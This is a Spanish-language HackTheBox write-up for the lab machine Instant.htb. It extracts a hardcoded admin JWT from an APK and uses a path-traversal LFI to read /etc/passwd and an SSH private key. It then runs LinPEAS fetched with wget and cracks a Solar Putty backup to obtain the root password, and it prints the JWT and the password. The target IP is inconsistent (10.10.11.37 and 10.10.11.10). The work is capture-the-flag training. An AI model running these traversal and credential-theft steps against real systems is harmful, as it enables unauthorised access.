WriteUp: Explotación de Instant.htb (HackTheBox)

Análisis de APK Android para extraer JWT hardcodeado, explotación de LFI en API REST para obtener clave SSH privada, y escalada vía descifrado de Solar Putty backup.

APK Analysis JWT LFI SSH

En este WriteUp, detallaré cómo logré comprometer la máquina Instant.htb en HackTheBox, desde la enumeración inicial hasta la escalada de privilegios.

Autor: zSodex
Dificultad: Medium

Técnicas Clave:

  • Enumeración → Nmap, Fuzzing, Análisis de APK
  • Explotación → LFI, JWT, API Abuse
  • Post-Explotación → Manipulación de claves SSH
  • PrivEsc → Descifrado de credenciales en backups

1. Enumeración Inicial

Escaneo con Nmap:

nmap -sCV 10.10.11.37 -T5 -PN

Observaciones:

  • Puerto 22 (SSH): OpenSSH en Ubuntu
  • Puerto 80 (HTTP): Servidor Apache con redirección a instant.htb

Configuración de /etc/hosts:

echo "10.10.11.10 instant.htb" | sudo tee -a /etc/hosts

2. Análisis del Servicio Web

Al acceder a http://instant.htb, encontré una página de una wallet digital que permitía descargar una aplicación Android (instant.apk).

Enumeración de Directorios y Subdominios:

gobuster dir -u http://instant.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

No encontré nada relevante por esta vía.

Descarga y Análisis del APK:

apktool d instant.apk

Dentro de los archivos extraídos, revisé res/xml/ y encontré dos subdominios interesantes. Los agregué a /etc/hosts:

echo "10.10.11.10 mywalletv1.instant.htb swagger-ui.instant.htb" | sudo tee -a /etc/hosts

3. Explotación de la API (Swagger UI)

El subdominio swagger-ui.instant.htb exponía una API documentada con Swagger. Las funcionalidades eran limitadas sin permisos de administrador.

Búsqueda de Credenciales en el APK:

grep -r -i "admin" .

En smali/com/instantlabs/instant/AdminActivities.smali encontré un JWT válido:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA

Explotación del LFI (Local File Inclusion):

La API tenía un endpoint /admin/read/log vulnerable a directory traversal:

curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2Fetc%2Fpasswd" \
  -H "accept: application/json" \
  -H "Authorization: JWT TOKEN"

Obtención de la Clave SSH:

curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa" \
  -H "accept: application/json" \
  -H "Authorization: JWT TOKEN"

Procesamiento de la clave:

sed 's/\n//g' clave.txt > clave_limpia.txt
sed 's/[",]//g' clave_limpia.txt > clave_lim.txt

echo "-----BEGIN OPENSSH PRIVATE KEY-----" > id_rsa
cat clave_lim.txt | fold -w 70 >> id_rsa
echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa

Acceso por SSH:

chmod 600 id_rsa
ssh shirohige@instant.htb -i id_rsa

4. Escalada de Privilegios

Enumeración con LinPEAS:

wget http://<mi_ip>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

Hallazgo clave: un backup encriptado en /opt/backups.

Descifrado del Backup — Solar Putty:

python3 SolarPuttyDecryptor.py sessions-backup.dat rockyou.txt

Contraseña obtenida: 12**24nzC!r0c%q12

Acceso como Root:

su - root
Password: 12**24nzC!r0c%q12

cat /root/root.txt
# ¡Máquina comprometida!

Conclusión

Este desafío combinó análisis de APK, explotación de APIs, LFI y descifrado de credenciales.

Lecciones aprendidas:

  • Siempre revisar archivos ocultos en aplicaciones móviles.
  • Validar permisos en endpoints de APIs.
  • No almacenar credenciales en backups sin cifrado fuerte.
